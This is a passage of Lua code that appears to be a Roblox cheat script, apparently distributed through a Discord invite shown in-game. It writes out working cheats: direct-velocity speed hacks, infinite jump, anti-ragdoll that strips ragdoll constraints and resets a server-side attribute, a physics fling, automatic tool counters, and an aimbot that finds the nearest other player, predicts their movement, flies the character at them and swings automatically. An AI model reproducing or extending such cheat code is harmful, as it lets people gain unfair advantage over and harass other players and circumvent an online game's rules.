                local currentVel = hrp.AssemblyLinearVelocity
                local newYVel = currentVel.Y
                if not isJumping and math.abs(currentVel.Y) < 1 then
                    newYVel = VELOCITY_Y_TRICK
                end
                hrp.AssemblyLinearVelocity = Vector3.new(
                    lastMoveDir.X * spd,
                    newYVel,
                    lastMoveDir.Z * spd
                )
            end
        end
    end
    if speedLabel then
        local currentSpeed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
        speedLabel.Text = "SPEED: " .. string.format("%.1f", currentSpeed)
    end
end)

local alConn, arConn = nil, nil
local alPhase, arPhase = 1, 1

-- ====== OBTENER VELOCIDADES PARA AUTO LEFT/RIGHT - SIEMPRE NS ======
local function getAutoSpeeds()
    return NS, NS  -- Fase 1 y 2 usan Normal Speed
end

local function stopAutoLeft()
    if alConn then alConn:Disconnect(); alConn = nil end
    alPhase = 1
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(Vector3.zero, false) end
        -- Tras detener, la velocidad manual se define por el modo actual
        -- No es necesario cambiar nada, el loop de movimiento usará getManualSpeed()
    end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if mobSetAutoLeft then mobSetAutoLeft(false) end
end

local function stopAutoRight()
    if arConn then arConn:Disconnect(); arConn = nil end
    arPhase = 1
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then hum:Move(Vector3.zero, false) end
    end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if mobSetAutoRight then mobSetAutoRight(false) end
end

local function disableAllAimbots()
    if autoBatEnabled then
        disableAutoBat()
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobSetAutoBat then mobSetAutoBat(false) end
    end
    if bypassToggled then
        toggleBypass(false)
    end
end

function startAutoLeft()
    if autoRightEnabled then
        autoRightEnabled = false
        stopAutoRight()
        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobSetAutoRight then mobSetAutoRight(false) end
    end
    disableAllAimbots()
    if alConn then alConn:Disconnect() end
    alPhase = 1
    alConn = RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end

        local spd1, spd2 = getAutoSpeeds()  -- Siempre NS, NS

        if alPhase == 1 then
            local tgt = Vector3.new(AP.L1.X, root.Position.Y, AP.L1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                alPhase = 2
                local d = AP.L2 - root.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = Vector3.new(mv.X * spd1, root.AssemblyLinearVelocity.Y, mv.Z * spd1)
                return
            end
            local d = AP.L1 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = Vector3.new(mv.X * spd1, root.AssemblyLinearVelocity.Y, mv.Z * spd1)
        elseif alPhase == 2 then
            local tgt = Vector3.new(AP.L2.X, root.Position.Y, AP.L2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                root.AssemblyLinearVelocity = Vector3.zero
                autoLeftEnabled = false
                if alConn then alConn:Disconnect(); alConn = nil end
                alPhase = 1
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if mobSetAutoLeft then mobSetAutoLeft(false) end
                local facePos = Vector3.new(AP.L_FACE.X, root.Position.Y, AP.L_FACE.Z)
                if (facePos - root.Position).Magnitude > 0.01 then
                    root.CFrame = CFrame.new(root.Position, facePos)
                end
                -- Tras detenerse, la velocidad manual se ajustará según el modo
                return
            end
            local d = AP.L2 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = Vector3.new(mv.X * spd2, root.AssemblyLinearVelocity.Y, mv.Z * spd2)
        end
    end)
end

function startAutoRight()
    if autoLeftEnabled then
        autoLeftEnabled = false
        stopAutoLeft()
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobSetAutoLeft then mobSetAutoLeft(false) end
    end
    disableAllAimbots()
    if arConn then arConn:Disconnect() end
    arPhase = 1
    arConn = RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end

        local spd1, spd2 = getAutoSpeeds()  -- Siempre NS, NS

        if arPhase == 1 then
            local tgt = Vector3.new(AP.R1.X, root.Position.Y, AP.R1.Z)
            if (tgt - root.Position).Magnitude < 1 then
                arPhase = 2
                local d = AP.R2 - root.Position
                local mv = Vector3.new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = Vector3.new(mv.X * spd1, root.AssemblyLinearVelocity.Y, mv.Z * spd1)
                return
            end
            local d = AP.R1 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = Vector3.new(mv.X * spd1, root.AssemblyLinearVelocity.Y, mv.Z * spd1)
        elseif arPhase == 2 then
            local tgt = Vector3.new(AP.R2.X, root.Position.Y, AP.R2.Z)
            if (tgt - root.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                root.AssemblyLinearVelocity = Vector3.zero
                autoRightEnabled = false
                if arConn then arConn:Disconnect(); arConn = nil end
                arPhase = 1
                if autoRightSetVisual then autoRightSetVisual(false) end
                if mobSetAutoRight then mobSetAutoRight(false) end
                local facePos = Vector3.new(AP.R_FACE.X, root.Position.Y, AP.R_FACE.Z)
                if (facePos - root.Position).Magnitude > 0.01 then
                    root.CFrame = CFrame.new(root.Position, facePos)
                end
                return
            end
            local d = AP.R2 - root.Position
            local mv = Vector3.new(d.X, 0, d.Z).Unit
            hum:Move(mv, false)
            root.AssemblyLinearVelocity = Vector3.new(mv.X * spd2, root.AssemblyLinearVelocity.Y, mv.Z * spd2)
        end
    end)
end

local function startUnwalk()
    local c = LP.Character
    if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then
        for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
            pcall(function() t:Stop() end)
        end
    end
    local anim = c:FindFirstChild("Animate")
    if anim then
        unwalkSavedAnimate = anim:Clone()
        anim:Destroy()
    end
end

local function stopUnwalk()
    local c = LP.Character
    if c then
        local existing = c:FindFirstChild("Animate")
        if not existing then
            local src = game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts")
            local starterAnim = src and src:FindFirstChild("Animate")
            if starterAnim then
                starterAnim:Clone().Parent = c
            elseif unwalkSavedAnimate then
                unwalkSavedAnimate:Clone().Parent = c
            end
        end
    end
    unwalkSavedAnimate = nil
end

local function setupSpeedIndicator(char)
    local head = char:WaitForChild("Head", 5)
    if not head then return end
    local oldBB = head:FindFirstChild("SUREHUBSpeedBB")
    if oldBB then oldBB:Destroy() end
    local bb = Instance.new("BillboardGui", head)
    bb.Name = "SUREHUBSpeedBB"
    bb.Size = UDim2.new(0, 180, 0, 56)
    bb.StudsOffset = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop = true

    local titleLabel = Instance.new("TextLabel", bb)
    titleLabel.Size = UDim2.new(1, 0, 0, 24)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "discord.gg/qm8Mfscff"
    titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.TextSize = 18
    titleLabel.TextScaled = false
    titleLabel.TextStrokeTransparency = 0
    titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

    speedLabel = Instance.new("TextLabel", bb)
    speedLabel.Size = UDim2.new(0, 180, 0, 26)
    speedLabel.Position = UDim2.new(0, 0, 0, 24)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text = "SPEED: 0.0"
    speedLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    speedLabel.Font = Enum.Font.GothamBold
    speedLabel.TextScaled = true
    speedLabel.TextStrokeTransparency = 0
    speedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
end

local antiRagdollConn = nil

local function stopAntiRagdoll()
    if antiRagdollConn then
        antiRagdollConn:Disconnect()
        antiRagdollConn = nil
    end
end

local function startAntiRagdoll()
    if antiRagdollConn then return end
    antiRagdollConn = RunService.Heartbeat:Connect(function()
        if not antiRagdollEnabled then
            stopAntiRagdoll()
            return
        end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root then return end
        local state = hum:GetState()
        local endTime = LP:GetAttribute("RagdollEndTime")
        local ragdolled = state == Enum.HumanoidStateType.Physics
                      or state == Enum.HumanoidStateType.Ragdoll
                      or state == Enum.HumanoidStateType.FallingDown
                      or (endTime and (endTime - workspace:GetServerTimeNow()) > 0)
        if ragdolled then
            pcall(function()
                LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
            end)
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") and not obj.Enabled then
                    obj.Enabled = true
                end
            end
            if hum.Health > 0 then
                hum.PlatformStand = false
                hum.AutoRotate = true
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end

local MEDUSA_COOLDOWN = 25

local function findMedusa()
    local c = LP.Character
    if not c then return nil end
    for _, t in ipairs(c:GetChildren()) do
        if t:IsA("Tool") then
            local n = t.Name:lower()
            if n:find("medusa") or n:find("head") or n:find("stone") then return t end
        end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") then
                local n = t.Name:lower()
                if n:find("medusa") or n:find("head") or n:find("stone") then return t end
            end
        end
    end
    return nil
end

local function useMedusaCounter()
    if medusaDebounce then return end
    if tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
    local c = LP.Character
    if not c then return end
    medusaDebounce = true
    local med = findMedusa()
    if not med then medusaDebounce = false; return end
    if med.Parent ~= c then
        local hum2 = c:FindFirstChildOfClass("Humanoid")
        if hum2 then hum2:EquipTool(med) end
    end
    pcall(function() med:Activate() end)
    medusaLastUsed = tick()
    medusaDebounce = false
end

local function onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if medusaCounterEnabled and part.Anchored and part.Transparency == 1 then useMedusaCounter() end
    end)
end

local function setupMedusa(char)
    for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
    Conns.anchor = {}
    if not char or not medusaCounterEnabled then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(Conns.anchor, onAnchorChanged(part))
        end
    end
    table.insert(Conns.anchor, char.DescendantAdded:Connect(function(part)
        if part:IsA("BasePart") then
            table.insert(Conns.anchor, onAnchorChanged(part))
        end
    end))
end

local function stopMedusaCounter()
    for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
    Conns.anchor = {}
end

local function onMedusaResetAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if medusaAutoResetEnabled and part.Anchored and part.Transparency == 1 then
            insta_reset()
        end
    end)
end

local function setupMedusaAutoReset(char)
    for _, c in pairs(medusaResetConns) do pcall(function() c:Disconnect() end) end
    medusaResetConns = {}
    if not char or not medusaAutoResetEnabled then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(medusaResetConns, onMedusaResetAnchorChanged(part))
        end
    end
    table.insert(medusaResetConns, char.DescendantAdded:Connect(function(part)
        if part:IsA("BasePart") then
            table.insert(medusaResetConns, onMedusaResetAnchorChanged(part))
        end
    end))
end

local function stopMedusaAutoReset()
    for _, c in pairs(medusaResetConns) do pcall(function() c:Disconnect() end) end
    medusaResetConns = {}
end

local dropConnections = {}

local function runDropBrainrot()
    if dropActive then return end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local speedH = 0
    if root then
        local vel = root.AssemblyLinearVelocity
        speedH = Vector3.new(vel.X, 0, vel.Z).Magnitude
    end
    local cooldown = 0.25
    if speedH > 5 then
        cooldown = 0.6
    else
        cooldown = 0.25
    end
    if tick() - lastDropTime < cooldown then return end
    lastDropTime = tick()
    dropActive = true
    if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
    if mobSetDropBR then mobSetDropBR(true) end
    local wasAutoBat = false
    if autoBatEnabled then
        wasAutoBat = true
        disableAutoBat()
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobSetAutoBat then mobSetAutoBat(false) end
    end
    local function finishDrop()
        dropActive = false
        local c = LP.Character
        if c then
            local root = c:FindFirstChild("HumanoidRootPart")
            local hum = c:FindFirstChildOfClass("Humanoid")
            if root then
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                if root.Position.Y < -100 then
                    root.CFrame = CFrame.new(root.Position.X, 5, root.Position.Z)
                end
                local rp = RaycastParams.new()
                rp.FilterDescendantsInstances = {c}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local rr = workspace:Raycast(root.Position, Vector3.new(0, -2000, 0), rp)
                if rr then
                    local off = (hum and hum.HipHeight or 2) + (root.Size.Y / 2)
                    root.CFrame = CFrame.new(root.Position.X, rr.Position.Y + off, root.Position.Z)
                end
                if hum and hum.Health > 0 then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
                task.wait(0.05)
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                task.wait(0.05)
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
                root.AssemblyLinearVelocity = Vector3.new(0, -1, 0)
                task.wait(0.03)
                root.AssemblyLinearVelocity = Vector3.zero
                if root.Position.Y < -100 then
                    root.CFrame = CFrame.new(root.Position.X, 5, root.Position.Z)
                end
            end
        end
        if wasAutoBat then
            enableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(true) end
            if mobSetAutoBat then mobSetAutoBat(true) end
        end
        if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
        if mobSetDropBR then mobSetDropBR(false) end
    end
    local flingThread = task.spawn(function()
        local startTime = tick()
        while dropActive and (tick() - startTime) < 0.25 do
            RunService.Heartbeat:Wait()
            local c = LP.Character
            local root = c and c:FindFirstChild("HumanoidRootPart")
            if not root then break end
            local vel = root.AssemblyLinearVelocity
            vel = Vector3.new(0, vel.Y, 0)
            root.AssemblyLinearVelocity = vel * 10000 + Vector3.new(0, 10000, 0)
            RunService.RenderStepped:Wait()
            if root and root.Parent then
                root.AssemblyLinearVelocity = vel
            end
            RunService.Stepped:Wait()
            if root and root.Parent then
                root.AssemblyLinearVelocity = vel + Vector3.new(0, 0.1, 0)
            end
        end
        finishDrop()
    end)
    table.insert(dropConnections, flingThread)
    task.delay(0.35, function()
        if dropActive then
            dropActive = false
            finishDrop()
        end
    end)
end

local function stopDropBrainrot()
    dropActive = false
    for _, t in ipairs(dropConnections) do
        if type(t) == "thread" then
            pcall(task.cancel, t)
        elseif type(t) == "RBXScriptConnection" then
            pcall(t.Disconnect, t)
        end
    end
    dropConnections = {}
    local c = LP.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyLinearVelocity = Vector3.zero
        end
    end
    if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
    if mobSetDropBR then mobSetDropBR(false) end
end

local function executeDropWithToggle(setVisual)
    if dropActive then return end
    task.spawn(function()
        if setVisual then setVisual(true) end
        runDropBrainrot()
        while dropActive do task.wait() end
        task.wait(0.1)
        if setVisual then setVisual(false) end
    end)
end

-- ====== INFINITE JUMP ======
local infJumpConn = nil
local holdJumpConn = nil
local holdJumpJumpConn = nil

local function startJumpMode()
    if not jumpEnabled then
        stopJumpMode()
        return
    end
    if jumpMode == 1 then
        if infJumpConn then infJumpConn:Disconnect() end
        infJumpConn = UIS.JumpRequest:Connect(function()
            local char = LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                root.Velocity = Vector3.new(root.Velocity.X, 56, root.Velocity.Z)
            end
        end)
        if holdJumpConn then holdJumpConn:Disconnect(); holdJumpConn = nil end
        if holdJumpJumpConn then holdJumpJumpConn:Disconnect(); holdJumpJumpConn = nil end
    else
        if holdJumpJumpConn then holdJumpJumpConn:Disconnect() end
        holdJumpJumpConn = UIS.JumpRequest:Connect(function()
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                root.Velocity = Vector3.new(root.Velocity.X, 54, root.Velocity.Z)
            end
        end)
        if holdJumpConn then holdJumpConn:Disconnect() end
        holdJumpConn = RunService.Heartbeat:Connect(function()
            if autoBatEnabled or bypassToggled then return end
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            local jumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum and hum.Jump == true)
            if jumpHeld and root.Velocity.Y < 30 then
                root.Velocity = Vector3.new(root.Velocity.X, 54, root.Velocity.Z)
            end
            if root.Velocity.Y < -120 then
                root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z)
            end
        end)
        if infJumpConn then infJumpConn:Disconnect(); infJumpConn = nil end
    end
end

local function stopJumpMode()
    if infJumpConn then infJumpConn:Disconnect(); infJumpConn = nil end
    if holdJumpConn then holdJumpConn:Disconnect(); holdJumpConn = nil end
    if holdJumpJumpConn then holdJumpJumpConn:Disconnect(); holdJumpJumpConn = nil end
end

-- Loop para limitar caída (siempre activo)
RunService.Heartbeat:Connect(function()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root and root.Velocity.Y < -120 then
        root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z)
    end
end)

local defLightBrightness,defLightClock,defLightAmbient,defGlobalShadows,defFogEnd

-- ====== ANTI-LAG ======
local function applyAntiLagDerender(obj)
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
        elseif obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
            for _, t in ipairs(obj:GetPlayingAnimationTracks()) do
                pcall(function() t:Stop(0) end)
            end
        end
    end)
end

local function enableAntiLag()
    removeAccessoriesEnabled = true
    antiLagEnabled = true
    if defLightBrightness == nil then
        defLightBrightness = Lighting.Brightness
    end
    if defLightClock == nil then
        defLightClock = Lighting.ClockTime
    end
    if defLightAmbient == nil then
        defLightAmbient = Lighting.OutdoorAmbient
    end
    if defGlobalShadows == nil then
        defGlobalShadows = Lighting.GlobalShadows
    end
    if defFogEnd == nil then
        defFogEnd = Lighting.FogEnd
    end
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.Brightness = 0
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or
               e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or
               e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end
    for _, obj in ipairs(workspace:GetDescendants()) do
        applyAntiLagDerender(obj)
    end
    if antiLagDescConn then antiLagDescConn:Disconnect() end
    antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if removeAccessoriesEnabled then
            applyAntiLagDerender(obj)
        end
    end)
end

local function disableAntiLag()
    removeAccessoriesEnabled = false
    antiLagEnabled = false
    if antiLagDescConn then
        antiLagDescConn:Disconnect()
        antiLagDescConn = nil
    end
    if defLightBrightness ~= nil then
        Lighting.Brightness = defLightBrightness
    end
    if defLightClock ~= nil then
        Lighting.ClockTime = defLightClock
    end
    if defLightAmbient ~= nil then
        Lighting.OutdoorAmbient = defLightAmbient
    end
    if defGlobalShadows ~= nil then
        Lighting.GlobalShadows = defGlobalShadows
    end
    if defFogEnd ~= nil then
        Lighting.FogEnd = defFogEnd
    end
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or
               e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or
               e:IsA("DepthOfFieldEffect") then
                e.Enabled = true
            end
        end)
    end
end

local batCounterDebounce = false
local BAT_COUNTER_SLAP_LIST = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}

local function findBatForCounter()
    local char = LP.Character
    if not char then return nil end
    local backpack = LP:FindFirstChildOfClass("Backpack")
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local tool = char:FindFirstChild(name) or (backpack and backpack:FindFirstChild(name))
        if tool then return tool end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
            return child
        end
    end
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
            end
        end
    end
    return nil
end

local function swingBatForCounter(bat, character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if bat.Parent ~= character and humanoid then
        pcall(function() humanoid:EquipTool(bat) end)
        task.wait(0.05)
    end
    local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end)
        task.wait(0.15)
        pcall(function() remote:FireServer() end)
    else
        pcall(function() bat:Activate() end)
        task.wait(0.15)
        pcall(function() bat:Activate() end)
    end
end

startBatCounter = function()
    if Conns.batCounter then return end
    Conns.batCounter = RunService.Heartbeat:Connect(function()
        if not batCounterEnabled then return end
        if batCounterDebounce then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        local state = humanoid:GetState()
        if state == Enum.HumanoidStateType.Physics or
           state == Enum.HumanoidStateType.Ragdoll or
           state == Enum.HumanoidStateType.FallingDown then
            batCounterDebounce = true
            task.spawn(function()
                local bat = findBatForCounter()
                if bat then
                    swingBatForCounter(bat, character)
                end
                task.wait(0.5)
                batCounterDebounce = false
            end)
        end
    end)
end

stopBatCounter = function()
    if Conns.batCounter then
        Conns.batCounter:Disconnect()
        Conns.batCounter = nil
    end
    batCounterDebounce = false
end

local function findBat()
    local char = LP.Character
    if not char then return nil end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
    end
    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
        end
    end
    return nil
end

local function isBatTool(tool)
    if not tool then return false end
    for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
        if tool.Name == name then return true end
    end
    return tool.Name:lower():find("bat") or tool.Name:lower():find("slap")
end

local _aimbotConn = nil
local _prevAutoRotate = nil
local _hittingCooldown = false

local function getClosestTarget()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

local function trySwing()
    if _hittingCooldown then return end
    _hittingCooldown = true
    pcall(function()
        local char = LP.Character
        if not char then return end
        local currentTool = char:FindFirstChildOfClass("Tool")
        if currentTool and not isBatTool(currentTool) then
            _hittingCooldown = false
            return
        end
        local bat = findBat()
        if bat then
            if bat.Parent ~= char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(bat) end) end
            end
            pcall(function() bat:Activate() end)
        end
    end)
    task.delay(0.1, function() _hittingCooldown = false end)
    task.delay(0.2, function()
        if _hittingCooldown then _hittingCooldown = false end
    end)
end

startAimbotAdapt = function()
    if _aimbotConn then return end
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then
        if _prevAutoRotate == nil then _prevAutoRotate = hum0.AutoRotate end
        hum0.AutoRotate = false
    end
    _aimbotConn = RunService.RenderStepped:Connect(function()
        if not autoBatEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        if not char:FindFirstChildOfClass("Tool") then
            local bat = findBat()
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end
        local target = getClosestTarget()
        if not target then return end
        local targetVel = target.AssemblyLinearVelocity
        local myPos = root.Position
        local targetPos = target.Position
        local predictPos = targetPos + targetVel * 0.14
        predictPos = predictPos + target.CFrame.LookVector * 0.3
        local direction = predictPos - myPos
        local flatDir = Vector3.new(direction.X, 0, direction.Z)
        if flatDir.Magnitude > 0 then flatDir = flatDir.Unit else flatDir = Vector3.new(0,0,0) end
        local desiredHeight = targetPos.Y + 3.7
        local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
        if hum.FloorMaterial ~= Enum.Material.Air then
            yVel = math.max(yVel, 13)
        end
        yVel = math.clamp(yVel, -70, 110)
        local desiredVel = Vector3.new(flatDir.X * BAT_AIMBOT_SPEED, yVel, flatDir.Z * BAT_AIMBOT_SPEED)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
        local speed3 = targetVel.Magnitude
        local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
        local predictedPos = targetPos + targetVel * predictTime
        local toPredict = predictedPos - myPos
        if toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(myPos, predictedPos)
            local diffCF = root.CFrame:Inverse() * goalCF
            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
            rx = math.clamp(rx, -2.5, 2.5)
            ry = math.clamp(ry, -2.5, 2.5)
            rz = math.clamp(rz, -2.5, 2.5)
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(
                Vector3.new(rx * 42, ry * 42, rz * 42)
            )
        end
        local distToTarget = (root.Position - target.Position).Magnitude
        if distToTarget <= 8 then
            trySwing()
        end
    end)
end

stopAimbotAdapt = function()
    if _aimbotConn then
        pcall(function() _aimbotConn:Disconnect() end)
        _aimbotConn = nil
    end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = (_prevAutoRotate == nil) and true or _prevAutoRotate
        hum.PlatformStand = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
    end
    if root then
        root.AssemblyLinearVelocity = Vector3.new(0, -0.1, 0)
        root.AssemblyAngularVelocity = Vector3.zero
    end
    _prevAutoRotate = nil
    _hittingCooldown = false
    lastMoveDir = Vector3.zero
end

enableAutoBat = function()
    if autoLeftEnabled then
        autoLeftEnabled = false
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        stopAutoLeft()
    end
    if autoRightEnabled then
        autoRightEnabled = false
        if autoRightSetVisual then autoRightSetVisual(false) end
        stopAutoRight()
    end
    if bypassToggled then
        bypassToggled = false
        if bypassFloatingButton then
            local btnFrame = bypassFloatingButton:FindFirstChild("Frame")
            if btnFrame then
                btnFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
                local lbl = btnFrame:FindFirstChild("TextLabel")
                if lbl then lbl.TextColor3 = Color3.fromRGB(0,0,0) end
            end
        end
        stopBypassAimbot()
        if bypassSetVisual then bypassSetVisual(false) end
        if tpBatSetVisual then tpBatSetVisual(false) end
        if mobSetBatTP then mobSetBatTP(false) end
    end
    autoBatEnabled = true
    if autoBatSetVisual then autoBatSetVisual(true) end
    if mobSetAutoBat then mobSetAutoBat(true) end
    startAimbotAdapt()
    saveNow()
end

disableAutoBat = function()
    autoBatEnabled = false
    if autoBatSetVisual then autoBatSetVisual(false) end
    if mobSetAutoBat then mobSetAutoBat(false) end
    stopAimbotAdapt()
    saveNow()
end

queueAutoBatStart = function()
    if autoLeftEnabled then
        autoLeftEnabled=false
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobSetAutoLeft then mobSetAutoLeft(false) end
        stopAutoLeft()
    end
    if autoRightEnabled then
        autoRightEnabled=false
